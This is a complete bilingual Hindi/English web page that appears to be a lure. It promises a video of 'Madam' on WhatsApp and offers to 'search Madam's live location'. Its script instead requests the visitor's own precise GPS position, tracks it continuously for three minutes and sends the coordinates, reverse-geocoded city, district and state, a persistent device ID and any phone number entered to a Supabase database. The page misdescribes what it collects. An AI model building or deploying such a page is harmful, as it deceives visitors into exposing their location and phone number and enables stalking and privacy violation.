<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Madam Live Location Searching मैडम की लाइव लोकेशन सर्चिंग</title>

<style>
* { box-sizing: border-box; }

body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    margin: 0;
    padding: 20px;
    text-align: center;
}

.container {
    max-width: 500px;
    margin: auto;
}

.phone-label {
    display: block;
    text-align: left;
    font-weight: bold;
    margin: 22px 0 8px;
}

.phone-input {
    width: 100%;
    padding: 14px;
    border: 1px solid #ccc;
    border-radius: 8px;
    font-size: 16px;
    background: white;
}

.note {
    text-align: left;
    font-size: 14px;
    color: #444;
    line-height: 1.7;
    margin-top: 10px;
    padding: 12px;
    background: #fff;
    border-radius: 8px;
}

button {
    padding: 14px 18px;
    margin: 18px 0 8px;
    width: 100%;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
    line-height: 1.5;
}

.start {
    background: #16a34a;
    color: white;
    animation: greenBlink 1s infinite;
}

.start:disabled {
    cursor: default;
    animation: none;
    opacity: 0.8;
}

@keyframes greenBlink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
}

#status {
    background: white;
    padding: 20px;
    margin-top: 20px;
    border-radius: 12px;
    text-align: left;
    line-height: 1.8;
    overflow-wrap: anywhere;
}
</style>
</head>

<body>
<div class="container">

    <h2>📍 Madam Live Location Searching</h2>
    <h2>📍 मैडम की लाइव लोकेशन सर्चिंग</h2>

    <label class="phone-label" for="phoneInput">
        📱 अपना मोबाइल नंबर डालें / Enter Your Mobile Number
    </label>

    <input
        type="tel"
        id="phoneInput"
        class="phone-input"
        inputmode="tel"
        maxlength="16"
        placeholder="Please enter your mobile number / मोबाइल नंबर डालें"
        autocomplete="tel"
    >

    <div class="note">
        📲 अपना मोबाइल नंबर डालें, तभी WhatsApp पर मैडम का वीडियो आएगा।
        <br>
        📲 Enter your mobile number to receive Madam's video on WhatsApp.
    </div>

    <button
        class="start"
        id="startButton"
        onclick="startTracking()">
        ▶ Start Location / मैडम की लोकेशन सर्च करना शुरू करें
    </button>

    <div id="status">
        📡 लोकेशन शेयर करना अभी शुरू नहीं हुआ है।
    </div>

</div>

<script>
"use strict";

/* SUPABASE */

const SUPABASE_URL =
    "https://qtfnupdojsqpuywhoryu.supabase.co";

const SUPABASE_KEY =
    "sb_publishable_GAsXGjXdKTZxlm5tqx-t0w_96i3RmKE";


/* DEVICE ID */

function getDeviceId() {
    let id = localStorage.getItem("device_id");

    if (!id) {
        id = crypto.randomUUID
            ? crypto.randomUUID()
            : "device-" + Date.now() + "-" +
              Math.random().toString(36).slice(2);

        localStorage.setItem("device_id", id);
    }

    return id;
}

const deviceId = getDeviceId();


/* SESSION VARIABLES */

let watchId = null;
let autoStopTimeout = null;
let sessionActive = false;
let sessionNumber = 0;
let sessionPhoneNumber = null;
let latestLocation = null;
let savingLocation = false;
let pendingLocation = null;
let lastSavedTime = 0;
let locationDetails = {
    city: "",
    district: "",
    state: ""
};


/* STATUS */

function showStatus(message) {
    document.getElementById("status").textContent = message;
}


/* PHONE NUMBER IS OPTIONAL */

function getPhoneNumber() {
    const value = document.getElementById("phoneInput").value.trim();

    if (!value) {
        return { valid: true, number: null };
    }

    const digits = value.replace(/\D/g, "");

    if (/^[6-9]\d{9}$/.test(digits)) {
        return { valid: true, number: "+91" + digits };
    }

    if (/^91[6-9]\d{9}$/.test(digits)) {
        return { valid: true, number: "+" + digits };
    }

    return { valid: false, number: null };
}


/* GET CITY, DISTRICT AND STATE FROM COORDINATES */

async function getLocationDetails(latitude, longitude) {
    const result = {
        city: "",
        district: "",
        state: ""
    };

    try {
        const url =
            "https://api.bigdatacloud.net/data/reverse-geocode-client" +
            "?latitude=" + encodeURIComponent(latitude) +
            "&longitude=" + encodeURIComponent(longitude) +
            "&localityLanguage=en";

        const response = await fetch(url);

        if (!response.ok) {
            throw new Error("Location lookup failed");
        }

        const data = await response.json();

        result.city =
            data.city ||
            data.locality ||
            "";

        result.district =
            data.localityInfo?.administrative?.find(item =>
                /district/i.test(item.description || item.name || "")
            )?.name ||
            data.localityInfo?.administrative?.find(item =>
                /county/i.test(item.description || item.name || "")
            )?.name ||
            "";

        result.state = data.principalSubdivision || "";

        /*
         * Some responses do not identify the district clearly.
         * Try OpenStreetMap as a fallback.
         */
        if (!result.district) {
            try {
                const fallbackURL =
                    "https://nominatim.openstreetmap.org/reverse" +
                    "?format=jsonv2&addressdetails=1&accept-language=en" +
                    "&lat=" + encodeURIComponent(latitude) +
                    "&lon=" + encodeURIComponent(longitude);

                const fallbackResponse = await fetch(fallbackURL);

                if (fallbackResponse.ok) {
                    const fallbackData = await fallbackResponse.json();
                    const address = fallbackData.address || {};

                    result.district =
                        address.state_district ||
                        address.district ||
                        address.county ||
                        "";

                    if (!result.city) {
                        result.city =
                            address.city ||
                            address.town ||
                            address.village ||
                            address.municipality ||
                            address.suburb ||
                            "";
                    }

                    if (!result.state) {
                        result.state = address.state || "";
                    }
                }
            } catch (fallbackError) {
                console.warn("Fallback lookup failed:", fallbackError);
            }
        }

    } catch (error) {
        console.warn("Reverse geocoding failed:", error);
    }

    return result;
}


/* START TRACKING */

function startTracking() {
    if (sessionActive) return;

    const button = document.getElementById("startButton");
    const phoneInput = document.getElementById("phoneInput");
    const phone = getPhoneNumber();

    if (!phone.valid) {
        showStatus("❌ सही भारतीय मोबाइल नंबर डालें या बॉक्स खाली छोड़ दें।");
        phoneInput.focus();
        return;
    }

    if (!navigator.geolocation) {
        showStatus("❌ इस ब्राउज़र में लोकेशन सुविधा उपलब्ध नहीं है।");
        return;
    }

    sessionPhoneNumber = phone.number;
    button.disabled = true;
    phoneInput.disabled = true;

    showStatus(
        "📡 GPS की अनुमति और लोकेशन की प्रतीक्षा है...\n\n" +
        "कृपया अपने डिवाइस में Location चालू रखें।"
    );

    navigator.geolocation.getCurrentPosition(
        async position => {
            if (sessionActive) return;

            sessionActive = true;
            const currentSession = ++sessionNumber;

            button.style.animation = "none";

            latestLocation = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };

            showStatus(
                "📍 लोकेशन सर्चिंग शुरू हो गई है।\n\n" +
                "ट्रैकिंग 3 मिनट बाद अपने आप बंद होगी।"
            );

            autoStopTimeout = setTimeout(() => {
                stopTracking(currentSession);
            }, 180000);

            /*
             * Watch GPS immediately, while location details
             * are being looked up.
             */
            watchId = navigator.geolocation.watchPosition(
                currentPosition => {
                    if (
                        !sessionActive ||
                        currentSession !== sessionNumber
                    ) return;

                    latestLocation = {
                        latitude: currentPosition.coords.latitude,
                        longitude: currentPosition.coords.longitude,
                        accuracy: currentPosition.coords.accuracy
                    };

                    queueSave(currentSession);
                },

                error => {
                    if (
                        !sessionActive ||
                        currentSession !== sessionNumber
                    ) return;

                    showStatus(
                        "⚠️ GPS अपडेट में समस्या आई: " +
                        error.message +
                        "\n\nट्रैकिंग निर्धारित समय पर बंद होगी।"
                    );
                },

                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 30000
                }
            );

            locationDetails = await getLocationDetails(
                latestLocation.latitude,
                latestLocation.longitude
            );

            if (
                !sessionActive ||
                currentSession !== sessionNumber
            ) return;

            queueSave(currentSession);
        },

        error => {
            button.disabled = false;
            phoneInput.disabled = false;
            button.style.animation = "greenBlink 1s infinite";

            showStatus(
                "❌ लोकेशन नहीं मिल सकी।\n\n" +
                "फोन/डिवाइस की Location चालू करें और ब्राउज़र को अनुमति दें।\n\n" +
                "समस्या: " + error.message
            );
        },

        {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 30000
        }
    );
}


/* SAVE THE LATEST GPS POSITION */

function queueSave(currentSession) {
    if (
        !sessionActive ||
        currentSession !== sessionNumber ||
        !latestLocation
    ) return;

    pendingLocation = {
        ...latestLocation,
        session: currentSession
    };

    processSaveQueue();
}


async function processSaveQueue() {
    if (savingLocation || !pendingLocation) return;

    savingLocation = true;

    try {
        while (pendingLocation) {
            const item = pendingLocation;
            pendingLocation = null;

            if (
                !sessionActive ||
                item.session !== sessionNumber
            ) continue;

            /*
             * Avoid creating excessive records from very frequent
             * GPS callbacks. Save at most once every 5 seconds.
             */
            const now = Date.now();

            if (lastSavedTime && now - lastSavedTime < 5000) {
                pendingLocation = item;

                await new Promise(resolve =>
                    setTimeout(resolve, 5000 - (now - lastSavedTime))
                );

                if (
                    !sessionActive ||
                    item.session !== sessionNumber
                ) {
                    pendingLocation = null;
                    continue;
                }

                if (pendingLocation === item) {
                    pendingLocation = null;
                }
            }

            const response = await fetch(
                SUPABASE_URL + "/rest/v1/locations",
                {
                    method: "POST",
                    headers: {
                        "apikey": SUPABASE_KEY,
                        "Content-Type": "application/json",
                        "Prefer": "return=minimal"
                    },
                    body: JSON.stringify({
                        device_id: deviceId,
                        phone_number: sessionPhoneNumber,
                        latitude: item.latitude,
                        longitude: item.longitude,
                        accuracy: item.accuracy,
                        city: locationDetails.city || null,
                        district: locationDetails.district || null,
                        state: locationDetails.state || null
                    })
                }
            );

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText);
            }

            lastSavedTime = Date.now();

            if (
                sessionActive &&
                item.session === sessionNumber
            ) {
                showStatus(
                    "📍 लोकेशन सर्चिंग जारी है।\n\n" +
                    "📱 मोबाइल नंबर: " +
                    (sessionPhoneNumber || "नंबर नहीं दिया गया") +
                    "\n\n" +
                    "✅ लोकेशन सर्वर पर सेव हो गई।\n" +
                    "🎯 Accuracy: " +
                    Number(item.accuracy).toFixed(1) + " m\n" +
                    "🏙️ City: " + (locationDetails.city || "-") +
                    "\n🗺️ State: " + (locationDetails.state || "-") +
                    "\n\n⏳ ट्रैकिंग 3 मिनट बाद अपने आप बंद होगी।"
                );
            }
        }
    } catch (error) {
        console.error("Supabase save error:", error);

        if (sessionActive) {
            showStatus(
                "⚠️ लोकेशन सर्वर पर सेव नहीं हो सकी।\n\n" +
                "इंटरनेट, Supabase की सेटिंग और टेबल के कॉलम जाँचें।"
            );
        }
    } finally {
        savingLocation = false;

        if (pendingLocation && sessionActive) {
            processSaveQueue();
        }
    }
}


/* STOP AFTER 3 MINUTES */

function stopTracking(currentSession) {
    if (
        !sessionActive ||
        currentSession !== sessionNumber
    ) return;

    sessionActive = false;

    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
    }

    if (autoStopTimeout !== null) {
        clearTimeout(autoStopTimeout);
        autoStopTimeout = null;
    }

    pendingLocation = null;

    showStatus(
        "✅ 3 मिनट पूरे हो गए हैं।\n\n" +
        "लोकेशन सर्चिंग अपने आप बंद हो गई है।\n\n" +
        "पहले से सेव रिकॉर्ड सुरक्षित हैं।"
    );

    const button = document.getElementById("startButton");
    const phoneInput = document.getElementById("phoneInput");

    button.disabled = false;
    phoneInput.disabled = false;
    button.style.animation = "greenBlink 1s infinite";

    sessionPhoneNumber = null;
    latestLocation = null;
    locationDetails = {
        city: "",
        district: "",
        state: ""
    };
    lastSavedTime = 0;
}
</script>
</body>
</html>
